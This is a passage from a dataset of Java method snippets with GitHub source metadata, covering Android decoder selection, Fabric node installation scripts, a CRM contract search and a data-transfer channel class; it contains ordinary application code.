"stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55443, "method_name": "getDecoderFromDevice", "class_name": "HWDecoderUtil", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Decoder", "snippet": "    public static Decoder getDecoderFromDevice() {\n        /*\n         * Try first blacklisted decoders (for all android versions)\n         */\n        for (DecoderBySOC decBySOC : sBlacklistedDecoderBySOCList) {\n            final String prop = getSystemPropertyCached(decBySOC.key);\n            if (prop != null) {\n                if (prop.contains(decBySOC.value))\n                    return decBySOC.dec;\n            }\n        }\n        /*\n         * Always try MediaCodec after JellyBean MR2,\n         * Try OMX or MediaCodec after HoneyComb depending on device properties.\n         * Otherwise, use software decoder by default.\n         */\n        if (AndroidUtil.isJellyBeanMR2OrLater())\n            return Decoder.ALL;\n        else if (AndroidUtil.isHoneycombOrLater()) {\n            for (DecoderBySOC decBySOC : sDecoderBySOCList) {\n                final String prop = getSystemPropertyCached(decBySOC.key);\n                if (prop != null) {\n                    if (prop.contains(decBySOC.value))\n                        return decBySOC.dec;\n                }\n            }\n        }\n        return Decoder.UNKNOWN;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/HWDecoderUtil.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55444, "method_name": "getAudioOutputFromDevice", "class_name": "HWDecoderUtil", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "AudioOutput", "snippet": "    public static AudioOutput getAudioOutputFromDevice() {\n        if (!AndroidUtil.isGingerbreadOrLater()) {\n            return AudioOutput.AUDIOTRACK;\n        } else {\n            for (AudioOutputBySOC aoutBySOC : sAudioOutputBySOCList) {\n                final String prop = getSystemPropertyCached(aoutBySOC.key);\n                if (prop != null) {\n                    if (prop.contains(aoutBySOC.value))\n                        return aoutBySOC.aout;\n                }\n            }\n            return AudioOutput.ALL;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/HWDecoderUtil.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55445, "method_name": "getSystemPropertyCached", "class_name": "HWDecoderUtil", "params": ["String"], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "    private static String getSystemPropertyCached(String key) {\n        String prop = sSystemPropertyMap.get(key);\n        if (prop == null) {\n            prop = getSystemProperty(key, \"none\");\n            sSystemPropertyMap.put(key, prop);\n        }\n        return prop;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/HWDecoderUtil.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55446, "method_name": "getSystemProperty", "class_name": "HWDecoderUtil", "params": ["String", "String"], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "    private static String getSystemProperty(String key, String def) {\n        try {\n            final ClassLoader cl = ClassLoader.getSystemClassLoader();\n            final Class<?> SystemProperties = cl.loadClass(\"android.os.SystemProperties\");\n            final Class<?>[] paramTypes = new Class[] { String.class, String.class };\n            final Method get = SystemProperties.getMethod(\"get\", paramTypes);\n            final Object[] params = new Object[] { key, def };\n            return (String) get.invoke(SystemProperties, params);\n        } catch (Exception e){\n            return def;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/HWDecoderUtil.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55447, "method_name": "install", "class_name": "InstallService", "params": ["RoleEnum", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void install(RoleEnum role, InitConfigEntity configEntity) {\n        List<String> allMyIps = NetUtil.getLocalIPList();\n\n        Map<RoleEnum, List<ServerEntity>> rolesMap = this.rolesBiz.getRolesMap();\n        List<ServerEntity> serverList = rolesMap.get(role);\n\n        boolean first = true;\n        for (ServerEntity server : serverList) {\n            if (server.getStatus() != InstallStatusEnum.SUCCESS) {\n                // \u5982\u679c\u4e3b\u8282\u70b9\u4e5f\u662f\u6b64\u89d2\u8272\uff0c\u5219\u5148\u5b89\u88c5\n                int initCount = 1;\n                if (allMyIps.stream().anyMatch(ip -> ip.equals(server.getHost()))) {\n                    Map<String, String> hosts = environmentService.getRoleNeedSetHost(role, configEntity);\n\n                    if (startRole(role, server.getRolePorts(), hosts, null)) {\n                        server.setStatus(InstallStatusEnum.SUCCESS);\n                    }\n                    InstallResult result = new InstallResult();\n                    result.setRole(server.getRole());\n                    result.setSuccess(true);\n                    updateInstallResult(server.getHost(), result, configEntity);\n                } else {\n                    //\u8bbe\u7f6e\u91cd\u8bd5\u6b21\u6570\u521d\u59cb\u5316\u503c\n                    int retryCount = 1;\n                    //\u8bbe\u7f6e\u91cd\u8bd5\u6b21\u6570\n                    int retryTotal = 10;\n                    // \u53d1\u9001\u5b89\u88c5\u6307\u4ee4\u7ed9\u4ece\u8282\u70b9\n                    do {\n                        HttpInstallResponse response = remoteService.sendInstallCommand(server, role, null, configEntity);\n                        if (ResponseCode.SUCCESS.getCode().equals(response.getCode())) {\n                            // log.warn(String.format(\"\u53d1\u9001\u5b89\u88c5\u6307\u4ee4\u7ed9 %s \u8282\u70b9\u5b89\u88c5 %s \u6210\u529f\", server.getHost(), role.name().toLowerCase()));\n                            log.warn(String.format(\"Send installation instructions to %s node to install %s successfully\", server.getHost(), role.name().toLowerCase()));\n                            server.setStatus(InstallStatusEnum.INSTALLING);\n                            break;\n                        }\n                        if (retryCount == retryTotal) {\n                            break;\n                        }\n                        // log.warn(String.format(\"\u53d1\u9001\u5b89\u88c5\u6307\u4ee4\u7ed9 %s \u8282\u70b9\u5b89\u88c5 %s \u5931\u8d25\uff0c\u7a0d\u540e\u91cd\u8bd5...\", server.getHost(), role.name().toLowerCase()));\n                        log.warn(String.format(\"Failed to sending installation instructions to %s node  to install %s, try again later...\", server.getHost(), role.name().toLowerCase()));\n                        try {\n                            Thread.sleep(3000);\n                        } catch (InterruptedException e) {\n                            e.printStackTrace();\n                        }\n                        retryCount++;\n                    } while (true);\n                }\n            }\n        }\n\n        // \u7b49\u5f85\u5b8c\u6210\u5b89\u88c5\n        int checkCount = 1;\n        int checkTotal = 10;\n        while (serverList.stream().anyMatch(s -> s.getStatus() != InstallStatusEnum.SUCCESS)) {\n            if (checkCount == checkTotal) {\n                break;\n            }\n            // log.info(String.format(\"\u7b49\u5f85\u6240\u6709 %s \u8282\u70b9\u5b8c\u6210\u5b89\u88c5...\", role.name().toLowerCase()));\n            log.info(String.format(\"Wait for all %s nodes to complete the installation...\", role.name().toLowerCase()));\n            try {\n                Thread.sleep(10000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            checkCount++;\n        }\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InstallService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55448, "method_name": "startRole", "class_name": "InstallService", "params": ["RoleEnum", "List<String>", "Map<String,String>", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean startRole(RoleEnum role, List<String> rolePorts, Map<String, String> hosts, String roleFolderName) {\n        return startRole(role, rolePorts, hosts, roleFolderName, null);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InstallService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55449, "method_name": "startRole", "class_name": "InstallService", "params": ["RoleEnum", "List<String>", "Map<String,String>", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean startRole(RoleEnum role, List<String> rolePorts, Map<String, String> hosts, String roleFolderName, String host) {\n        // log.info(String.format(\"\u5f00\u59cb\u6267\u884c\u89d2\u8272 %s \u7684\u811a\u672c\", role.name()));\n        log.info(String.format(\"Start executing the script code of role %s\", role.name()));\n        if (!new File(modeService.getInstallPath()).exists()) {\n            FileUtil.makeFilePath(modeService.getInstallPath(), false);\n        }\n\n        String[] env = null;\n        String shellFilePath = null;\n        String workingDir = null;\n        switch (role) {\n            case ORDER:\n                workingDir = modeService.getInstallPath() + (StringUtils.isEmpty(roleFolderName) ? \"order\" : roleFolderName);\n                shellFilePath = modeService.getInstallPath() + (StringUtils.isEmpty(roleFolderName) ? \"order\" : roleFolderName) + \"/start-orderer.sh up\";\n                break;\n\n            case PEER:\n                workingDir = modeService.getInstallPath() + (StringUtils.isEmpty(roleFolderName) ? \"peer\" : roleFolderName);\n                shellFilePath = modeService.getInstallPath() + (StringUtils.isEmpty(roleFolderName) ? \"peer\" : roleFolderName) + \"/start-peer.sh up\";\n                break;\n        }\n        if (!StringUtils.isEmpty(shellFilePath)) {\n            environmentService.envSet(rolePorts, hosts);\n\n            try {\n                ProcessUtil.Result res = ProcessUtil.execCmd(\"bash \" + shellFilePath, env, workingDir);\n                return res.getCode() == 0;\n            } catch (Exception e) {\n                // log.error(String.format(\"\u542f\u52a8\u89d2\u8272%s\u811a\u672c\u5f02\u5e38\", role.name()), e);\n                log.error(String.format(\"An exception occurred while executing script code for role %s\", role.name()), e);\n                e.printStackTrace();\n            }\n        }\n\n        return false;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InstallService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55450, "method_name": "updateInstallResult", "class_name": "InstallService", "params": ["String", "InstallResult", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateInstallResult(String remoteAddress, InstallResult result, InitConfigEntity configEntity) {\n        if (configEntity == null) {\n            File configFile = new File(this.initConfigFile);\n            Yaml yaml = new Yaml();\n            try {\n                configEntity = yaml.loadAs(new FileInputStream(configFile), InitConfigEntity.class);\n            } catch (Exception e) {\n                e.printStackTrace();\n                return;\n            }\n        }\n        if (result.isSuccess()) {\n            // log.info(String.format(\"\u8282\u70b9 %s \u5df2\u5b8c\u6210 %s \u89d2\u8272\u7684\u5b89\u88c5\", remoteAddress, result.getRole().name()));\n            log.info(String.format(\"Node %s has intalled complete %s roles\", remoteAddress, result.getRole().name()));\n\n            // \u52a0\u5165\u6570\u636e\u5e93\n            switch (result.getRole()) {\n                case ORDER:\n                    modeService.checkAndInsertDb(configEntity.getOrdererHostConfig(), remoteAddress, RoleEnum.ORDER, configEntity.getOrgMSPID());\n                    break;\n                case PEER:\n                    modeService.checkAndInsertDb(configEntity.getPeerHostConfig(), remoteAddress, RoleEnum.PEER, configEntity.getOrgMSPID());\n                    break;\n            }\n        }\n        this.rolesBiz.updateInstallResult(remoteAddress, result);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InstallService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55451, "method_name": "search", "class_name": "MessageTypeSearchEmail", "params": ["DynActionForm", "ConnectionSet", "Message", "Set<CommonObjectLink>"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void search( DynActionForm form, ConnectionSet conSet, \n\t                    Message message, Set<CommonObjectLink> result )\n\t\tthrows BGException\n\t{\n\t\tString email = message.getFrom();\n\t\t\n\t\tSearchResult<Contract> searchResult = new SearchResult<Contract>();\n\t\tnew ContractDAO( form.getUser(), billingId ).searchContractByEmailParam( searchResult, null, paramIds, email );\n\t\t\n\t\tfor( Contract contract : searchResult.getList() )\n\t\t{\n\t\t\tresult.add( new CommonObjectLink( 0, Contract.OBJECT_TYPE + \":\" + contract.getBillingId(), \n\t\t\t                                  contract.getId(), contract.getTitle(), contract.getComment() ) );\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/dao/MessageTypeSearchEmail.java", "stars": "12", "class_props": {"extends": "MessageTypeSearchBilling", "implements": null, "modifiers": ["public"]}}, {"id": 55452, "method_name": "close", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void close(){\n        this.isClosed = true;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55453, "method_name": "open", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void open(){\n        this.isClosed = false;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55454, "method_name": "isClosed", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isClosed(){\n        return isClosed;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55455, "method_name": "getTaskGroupId", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getTaskGroupId(){\n        return this.taskGroupId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55456, "method_name": "getCapacity", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCapacity(){\n        return capacity;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55457, "method_name": "getByteSpeed", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getByteSpeed(){\n        return byteSpeed;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55458, "method_name": "getConfiguration", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Configuration", "snippet": "    public Configuration getConfiguration(){\n        return this.configuration;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55459, "method_name": "setCommunication", "class_name": "AbstractChannel", "params": ["Communication"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCommunication(final Communication communication){\n        this.currentCommunication = communication;\n        this.lastCommunication.reset();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55460, "method_name": "push", "class_name": "AbstractChannel", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void push(final T t){\n        Validate.notNull(t, \"push domain cannot be empty in channel\");\n        this.doPush(t);\n        this.statPush(1L, t.getByteSize());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55461, "method_name": "pushTerminate", "class_name": "AbstractChannel", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushTerminate(final T t){\n        Validate.notNull(t, \"push domain cannot be empty in channel\");\n        this.doPush(t);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55462, "method_name": "pushAll", "class_name": "AbstractChannel", "params": ["Collection<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pushAll(final Collection<T> collection){\n        Validate.notNull(collection);\n        Validate.noNullElements(collection);\n        for(T t : collection){\n            push(t);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55463, "method_name": "pull", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T pull(){\n        List<T> pulled = (List<T>) doPullInSync(1, new ArrayList<>(), collection -> collection.add(this.doPull()));\n        T data = pulled.get(0);\n        this.statPull(1L, data.getByteSize());\n        return data;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55464, "method_name": "pullAll", "class_name": "AbstractChannel", "params": ["Collection<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pullAll(final Collection<T> collection){\n        Validate.notNull(collection);\n        doPullInSync(Integer.MAX_VALUE, collection, this::doPullAll);\n        this.statPull(collection.size(),  this.getByteSize(collection));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55465, "method_name": "doPullInSync", "class_name": "AbstractChannel", "params": ["int", "Collection<T>", "Consumer<Collection>"], "throws": null, "modifiers": ["private"], "return_type": "Collection<T>", "snippet": "    private Collection<T> doPullInSync(int maxPullSize, Collection<T> pulled, Consumer<Collection<T>> pullFunction){\n        String hashCode = String.valueOf(Thread.currentThread().hashCode());\n        pulled.clear();\n        consumeLock.lock();\n        try {\n            while(!cachePulled.isEmpty()){\n                AtomicInteger counter = consumeCache.computeIfAbsent(hashCode, key -> new AtomicInteger(0));\n                //Only the different consuming threads can consume the cache\n                int pos = counter.get();\n                if(consumeSem.get() > 0 && pos >= cachePulled.size()){\n                    try {\n                        //Await other consumers\n                        notConsumed.await();\n                    } catch (InterruptedException e) {\n                        Thread.currentThread().interrupt();\n                        throw new IllegalStateException(e);\n                    }\n                }else {\n                    int count = 0;\n                    for(int i = pos; count < maxPullSize && i < cachePulled.size(); i++){\n                        //Consume cache\n                        pulled.add((T) cachePulled.get(i).copyElement());\n                        count ++;\n                    }\n                    if(counter.addAndGet(count) >= cachePulled.size() && consumeSem.decrementAndGet() <= 0){\n                        //Empty the cache and reset the semaphore\n                        cachePulled.clear();\n                        consumeSem.set(consumers - 1);\n                        consumeCache.forEach((key, value) -> value.set(0));\n                        notConsumed.signalAll();\n                    }\n                    return pulled;\n                }\n            }\n            //Fill pulled collection\n            pullFunction.accept(pulled);\n            if(consumers > 1 && consumeIsolated){\n                //In the situation of multiply consumers, use the cache\n                cachePulled.addAll(pulled);\n                AtomicInteger counter = consumeCache.computeIfAbsent(hashCode, key -> new AtomicInteger(0));\n                //Mark the current thread that has consumed the cache\n                counter.set(pulled.size());\n            }\n            return pulled;\n        }finally{\n            consumeLock.unlock();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55466, "method_name": "statPull", "class_name": "AbstractChannel", "params": ["long", "long"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void statPull(long dataSize, long byteSize){\n\n        statPull(currentCommunication, dataSize);\n        currentCommunication.increaseCounter(CommunicationTool.WRITE_RECEIVED_BYTES, byteSize);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55467, "method_name": "statPush", "class_name": "AbstractChannel", "params": ["long", "long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void statPush(long dataSize,long byteSize){\n        boolean isChannelByteSpeedLimit = (this.byteSpeed > 0);\n        boolean isChannelDataSpeedLimit = (this.dataSpeed > 0);\n\n        if(!isChannelByteSpeedLimit && !isChannelDataSpeedLimit){\n            return;\n        }\n        if(byteSize > 0){\n            rateLimiterByte.acquire((int)byteSize);\n        }\n        statPush(currentCommunication, dataSize);\n        if(rateLimiterData != null && dataSize > 0){\n            rateLimiterData.acquire((int)dataSize);\n        }\n        currentCommunication.increaseCounter(CommunicationTool.READ_SUCCEED_BYTES, byteSize);\n\n        currentCommunication.setLongCounter(CommunicationTool.WAIT_READER_TIME, waitReaderTime.get());\n        currentCommunication.setLongCounter(CommunicationTool.WAIT_WRITER_TIME, waitWriterTime.get());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55468, "method_name": "adjustRateLimit", "class_name": "AbstractChannel", "params": ["long", "long"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void adjustRateLimit(long byteSpeed, long dataSpeed){\n        if(byteSpeed > 0 && null != this.rateLimiterByte &&\n                byteSpeed != this.rateLimiterByte.getRate()) {\n            this.rateLimiterByte.setRate(byteSpeed);\n        }\n        if(dataSpeed > 0 && null != this.rateLimiterData &&\n                dataSpeed != this.rateLimiterData.getRate()) {\n            this.rateLimiterData.setRate(dataSpeed);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55469, "method_name": "getByteSize", "class_name": "AbstractChannel", "params": ["Collection<T>"], "throws": null, "modifiers": ["private"], "return_type": "long", "snippet": "    private long getByteSize(final Collection<T> rs){\n        final long[] size = {0};\n        rs.forEach(t -> size[0] += t.getByteSize());\n        return size[0];\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55470, "method_name": "doPush", "class_name": "AbstractChannel", "params": ["T"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void doPush(T t);\n\n    /**\n     * do push all\n     * @param collection\n     */\n    protected void doPushAll(Collection<T> collection){\n        //default not support\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55471, "method_name": "doPushAll", "class_name": "AbstractChannel", "params": ["Collection<T>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void doPushAll(Collection<T> collection){\n        //default not support\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55472, "method_name": "doPull", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "T", "snippet": "    protected abstract T doPull();\n\n    /**\n     * do pull all\n     * @param collection\n     */\n    protected void doPullAll(Collection<T> collection){\n        //default not support\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55473, "method_name": "doPullAll", "class_name": "AbstractChannel", "params": ["Collection<T>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void doPullAll(Collection<T> collection){\n        //default not support\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55474, "method_name": "incConsumer", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void incConsumer(){\n        consumeSem.compareAndSet(consumers - 1, consumers);\n        consumers ++;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55475, "method_name": "doCheckPoint", "class_name": "AbstractChannel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void doCheckPoint(String checkPointId){\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55476, "method_name": "size", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "int", "snippet": "    public abstract int size();\n\n    public  abstract boolean isEmpty();\n\n    public abstract void clear();\n\n    /**\n     * stat push\n     * @param dataSize\n     */\n    protected abstract void statPush(Communication currentCommunication, long dataSize);\n\n    /**\n     * stat pull\n     * @param currentCommunication\n     * @param dataSize\n     */\n    protected abstract void statPull(Communication currentCommunication, long dataSize);\n    /**\n     * current domain speed\n     * @return\n     */\n    protected abstract long currentDataSpeed(Communication currentCommunication, Communication lastCommunication, long interval);\n\n    /**\n     * update counter\n     * @param currentCommunication\n     * @param lastCommunication\n     */\n    protected abstract void updateCounter(Communication currentCommunication, Communication lastCommunication);\n    /**\n     *  the log printed in the first time\n     */\n    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55477, "method_name": "isEmpty", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "boolean", "snippet": "    public  abstract boolean isEmpty();\n\n    public abstract void clear();\n\n    /**\n     * stat push\n     * @param dataSize\n     */\n    protected abstract void statPush(Communication currentCommunication, long dataSize);\n\n    /**\n     * stat pull\n     * @param currentCommunication\n     * @param dataSize\n     */\n    protected abstract void statPull(Communication currentCommunication, long dataSize);\n    /**\n     * current domain speed\n     * @return\n     */\n    protected abstract long currentDataSpeed(Communication currentCommunication, Communication lastCommunication, long interval);\n\n    /**\n     * update counter\n     * @param currentCommunication\n     * @param lastCommunication\n     */\n    protected abstract void updateCounter(Communication currentCommunication, Communication lastCommunication);\n    /**\n     *  the log printed in the first time\n     */\n    protected abstract void firstPrint();\n\n\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/channel/AbstractChannel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55478, "method_name": "clear", "class_name": "AbstractChannel", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void clear();\n\n    /**\n     * stat push\n     * @param dataSize\n     */\n    protected abstract void statPush(Communication currentCommunication, long dataSize);\n\n    /**\n     * stat pull\n     * @param currentCommunication\n     * @param dataSize\n     */\n    protected abstract void statPull(Communication currentCommunication, long dataSize);\n    /**\n     * current domain speed\n     * @return\n     */\n    protected abstract long currentDataSpeed(Communication currentCommunication, Communication lastCommunication, long interval);\n\n    /**\n     * update counter\n     * @param currentCommunication\n     